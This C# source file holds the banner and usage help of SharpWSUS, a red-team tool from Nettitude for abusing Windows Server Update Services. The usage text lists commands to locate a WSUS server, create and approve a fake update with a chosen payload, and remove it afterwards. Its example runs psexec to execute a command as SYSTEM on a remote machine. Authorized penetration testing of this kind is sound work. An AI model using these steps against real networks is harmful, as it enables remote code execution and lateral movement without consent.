using System;

namespace SharpWSUS.Args
{
    public static class Info
    {
        public static void ShowLogo()
        {
            string logo = @"
 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team
";
            Console.WriteLine(logo);
        }

        public static void ShowUsage()
        {
            string usage = @"
Commands listed below have optional parameters in <>. 

Locate the WSUS server:
    SharpWSUS.exe locate

Inspect the WSUS server, enumerating clients, servers and existing groups:
    SharpWSUS.exe inspect 

Create an update (NOTE: The payload has to be a windows signed binary):
    SharpWSUS.exe create /payload:[File location] /args:[Args for payload] </title:[Update title] /date:[YYYY-MM-DD] /kb:[KB on update] /rating:[Rating of update] /msrc:[MSRC] /description:[description] /url:[url]>

Approve an update:
    SharpWSUS.exe approve /updateid:[UpdateGUID] /computername:[Computer to target] </groupname:[Group for computer to be added too] /approver:[Name of approver]>

Check status of an update:
    SharpWSUS.exe check /updateid:[UpdateGUID] /computername:[Target FQDN]

Delete update and clean up groups added:
    SharpWSUS.exe delete /updateid:[UpdateGUID] /computername:[Target FQDN] </groupname:[GroupName] /keepgroup>

##### Examples ######
Executing whoami as SYSTEM on a remote machine:
    SharpWSUS.exe inspect
    SharpWSUS.exe create /payload:""C:\Users\Test\Documents\psexec.exe"" /args:""-accepteula -s -d cmd.exe /c """"whoami > C:\test.txt"""""" /title:""Great Update"" /date:2021-10-03 /kb:500123 /rating:Important /description:""Really important update"" /url:""https://google.com""
    SharpWSUS.exe approve /updateid:93646c49-7d21-4576-9922-9cbcce9f8553 /computername:test1 /groupname:""Great Group""
    SharpWSUS.exe check /updateid:93646c49-7d21-4576-9922-9cbcce9f8553 /computername:test1
    SharpWSUS.exe delete /updateid:93646c49-7d21-4576-9922-9cbcce9f8553 /computername:test1 /groupname:""Great Group""
";
            Console.WriteLine(usage);
        }
    }
}
